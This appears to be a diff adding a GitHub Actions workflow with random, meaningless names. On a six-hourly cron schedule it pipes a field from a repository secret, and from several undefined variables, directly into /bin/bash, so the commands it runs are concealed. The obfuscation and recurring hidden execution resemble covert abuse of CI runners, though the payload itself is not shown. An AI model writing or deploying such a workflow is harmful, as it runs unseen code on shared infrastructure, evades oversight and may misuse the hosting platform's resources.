@@ -1,0 +1,25 @@
+name: ragregshibie
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ragregshibie
+        env:
+          sekvm2569: ${{ secrets.sekvm2569 }}
+        run: |
+          echo $sekvm2569 | jq -r .gtnf775 | /bin/bash
+          echo $fkz38 | jq -r .hcfr84 | /bin/bash
+          echo $xwc25 | jq -r .pygh4 | /bin/bash
+          echo $a05 | jq -r .zel3952 | /bin/bash
+          echo $uegjf44 | jq -r .rfl256 | /bin/bash
+          echo $zzlh7 | jq -r .qvnys96 | /bin/bash
+          echo $qao50 | jq -r .zy8874 | /bin/bash
+          echo $ohqvh3577 | jq -r .jc4480 | /bin/bash
+          echo $tulf8 | jq -r .gt419 | /bin/bash
+
